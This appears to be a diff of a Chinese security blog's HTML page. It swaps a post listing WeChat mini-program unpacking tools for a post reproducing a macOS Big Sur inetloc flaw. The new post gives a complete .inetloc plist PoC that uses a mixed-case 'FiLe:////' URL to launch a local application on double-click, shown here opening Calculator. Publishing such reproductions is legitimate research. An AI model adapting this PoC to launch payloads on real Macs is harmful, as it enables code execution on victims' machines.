@@ -21,30 +21,29 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="工具列表注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功">
+<meta name="description" content="big sur&lt;&#x3D;11.2.3 (20D91）POC保存为hello.inetloc            URL     FiLe:&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;System&#x2F;Applications&#x2F;Calculator.app">
 <meta property="og:type" content="article">
-<meta property="og:title" content="小程序安全测试--微信（1）">
-<meta property="og:url" content="http://example.com/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:title" content="MacOS 2021-9-21 inetloc复现">
+<meta property="og:url" content="http://example.com/2021/09/22/macos%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="Kid">
-<meta property="og:description" content="工具列表注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功">
+<meta property="og:description" content="big sur&lt;&#x3D;11.2.3 (20D91）POC保存为hello.inetloc            URL     FiLe:&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;System&#x2F;Applications&#x2F;Calculator.app">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/mac%E8%B7%AF%E5%BE%84.png">
-<meta property="og:image" content="http://example.com/images/%E8%A7%A3%E5%8C%85.jpg">
-<meta property="article:published_time" content="2021-09-03T12:19:49.000Z">
-<meta property="article:modified_time" content="2021-09-14T16:28:30.238Z">
+<meta property="og:image" content="http://example.com/images/cal.jpg">
+<meta property="article:published_time" content="2021-09-22T09:33:00.000Z">
+<meta property="article:modified_time" content="2021-09-22T13:58:54.773Z">
 <meta property="article:author" content="Kid">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/mac%E8%B7%AF%E5%BE%84.png">
+<meta name="twitter:image" content="http://example.com/images/cal.jpg">
 
 
-<link rel="canonical" href="http://example.com/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/">
+<link rel="canonical" href="http://example.com/2021/09/22/macos%E5%A4%8D%E7%8E%B0/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/","path":"2021/09/03/小程序测试/","title":"小程序安全测试--微信（1）"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/09/22/macos%E5%A4%8D%E7%8E%B0/","path":"2021/09/22/macos复现/","title":"MacOS 2021-9-21 inetloc复现"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>小程序安全测试--微信（1） | Kid</title>
+<title>MacOS 2021-9-21 inetloc复现 | Kid</title>
   
 
   <script src="/js/third-party/analytics/baidu-analytics.js"></script>
@@ -125,7 +124,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8"><span class="nav-number">1.</span> <span class="nav-text">工具列表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84"><span class="nav-number">2.</span> <span class="nav-text">路径</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#big-sur-lt-11-2-3-20D91%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">big sur&lt;&#x3D;11.2.3 (20D91）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-number">2.</span> <span class="nav-text">POC</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -187,7 +186,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/22/macos%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/head.png">
@@ -200,7 +199,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          小程序安全测试--微信（1）
+          MacOS 2021-9-21 inetloc复现
         </h1>
 
         <div class="post-meta-container">
@@ -210,23 +209,17 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2021-09-03 12:19:49" itemprop="dateCreated datePublished" datetime="2021-09-03T12:19:49Z">2021-09-03</time>
+      <time title="创建时间：2021-09-22 09:33:00 / 修改时间：13:58:54" itemprop="dateCreated datePublished" datetime="2021-09-22T09:33:00Z">2021-09-22</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-09-14 16:28:30" itemprop="dateModified" datetime="2021-09-14T16:28:30Z">2021-09-14</time>
-      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" itemprop="url" rel="index"><span itemprop="name">小程序</span></a>
+          <a href="/categories/MacOS/" itemprop="url" rel="index"><span itemprop="name">MacOS</span></a>
         </span>
     </span>
 
@@ -240,18 +233,20 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h1><pre><code>注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功
+        <h1 id="big-sur-lt-11-2-3-20D91）"><a href="#big-sur-lt-11-2-3-20D91）" class="headerlink" title="big sur&lt;=11.2.3 (20D91）"></a>big sur&lt;=11.2.3 (20D91）</h1><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>保存为hello.inetloc
 </code></pre>
-<span id="more"></span>    
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+  <dict>
+    <key>URL</key>
+    <string>FiLe:////////////////////////System/Applications/Calculator.app</string>
+  </dict>
+</plist>
 
-<p>app端解包<br>python (<a target="_blank" rel="noopener" href="https://github.com/leo9960/wechat-app-unpack">https://github.com/leo9960/wechat-app-unpack</a>)<br>nodejs 也有编译好的客户端 (<a target="_blank" rel="noopener" href="https://github.com/xuedingmiaojun/mp-unpack">https://github.com/xuedingmiaojun/mp-unpack</a>)</p>
-<p>pc端解包<br>pc端可能带加密，所以需要先转码<br>(<a target="_blank" rel="noopener" href="https://github.com/maotoumao/wxpc-miniprogram-decryption">https://github.com/maotoumao/wxpc-miniprogram-decryption</a>)<br>原理：<br>(<a target="_blank" rel="noopener" href="https://juejin.cn/post/6888348237242040327">https://juejin.cn/post/6888348237242040327</a>)<br>(<a target="_blank" rel="noopener" href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a>)</p>
-<h1 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h1><p>Android：<br>/data/data/com.tencent.mm/MicroMsg/32位长文件/appbrand/pkg</p>
-<p>IOS：<br>/var/mobile/Containers/Data/Application/{程序UUID}/Library/WechatPrivate/{用户ID}/WeApp/LocalCache/release/{小程序ID}/</p>
-<p>mac路径：</p>
-<p>~/Library/Group Containers/5A4RE8SF68.com.tencent.xinWeChat/Library/Caches/xinWeChat/817f39087ae1fbf97dc81798419249c7/WeApp/LocalCache/release/wx3ba512d53df66a75/4/Module<br><img src="/images/mac%E8%B7%AF%E5%BE%84.png"></p>
-<p>以某球影城为例：<br>从Android复制过来4个包，一个主文件，三个子文件<br><img src="/images/%E8%A7%A3%E5%8C%85.jpg"></p>
-<p>案列一：</p>
+<span id="more"></span>    
+<p>双击执行</p>
+<p><img src="/images/cal.jpg" alt="计算器"></p>
 
     </div>
 
@@ -283,7 +278,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/" title="小程序安全测试--微信（1）">http://example.com/2021/09/03/小程序测试/</a>
+      <a href="http://example.com/2021/09/22/macos%E5%A4%8D%E7%8E%B0/" title="MacOS 2021-9-21 inetloc复现">http://example.com/2021/09/22/macos复现/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -296,11 +291,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
+                <a href="/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/" rel="prev" title="小程序安全测试--微信（1）">
+                  <i class="fa fa-chevron-left"></i> 小程序安全测试--微信（1）
+                </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/09/22/macos%E5%A4%8D%E7%8E%B0/" rel="next" title="MacOS 2021-9-21 inetloc复现">
-                  MacOS 2021-9-21 inetloc复现 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
